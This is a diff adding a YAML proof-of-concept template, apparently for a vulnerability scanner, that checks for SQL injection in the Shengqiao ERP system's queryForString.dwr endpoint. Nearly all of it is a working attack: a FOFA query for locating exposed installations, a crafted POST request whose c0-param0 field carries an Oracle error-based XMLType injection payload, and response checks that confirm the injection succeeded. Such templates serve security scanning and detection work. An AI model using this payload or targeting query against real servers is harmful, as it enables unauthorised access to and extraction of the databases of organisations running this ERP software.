@@ -1,0 +1,45 @@
+id: poc-yaml-shengqiao-erp-queryforstring-dwr-sqli
+info:
+  name: 圣乔ERP系统 queryForString.dwr SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 圣乔ERP系统
+  fofa: title="圣乔ERP系统"
+requests:
+- method: POST
+  path: /erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'c0-id=0
+
+    batchId=0
+
+    callCount=1
+
+    c0-param1=Object_Object:{}
+
+    page=/erp/dwr/test/NamedParameterSingleRowQueryConvertor
+
+    httpSessionId=47CA299619667847F1BB450454E6C2D4
+
+    scriptSessionId=F3F037EB7A5102043AD4CEB47EB17A7275
+
+    c0-scriptName=NamedParameterSingleRowQueryConvertor
+
+    c0-methodName=queryForString
+
+    c0-param0=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(122)||CHR(122)||CHR(113)||(SELECT
+    (CASE WHEN (99=99) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(122)||CHR(118)||CHR(113)||CHR(62)))
+    FROM DUAL)'
+  expression: 'status_code == 200 &&
+
+    contains(body,"qjzzq1qvzvq") &&
+
+    contains(body,"SYS.XMLTYPE") &&
+
+    contains(body,"java.sql.SQLException")
+
+    '
+variables: {}
+transport: http
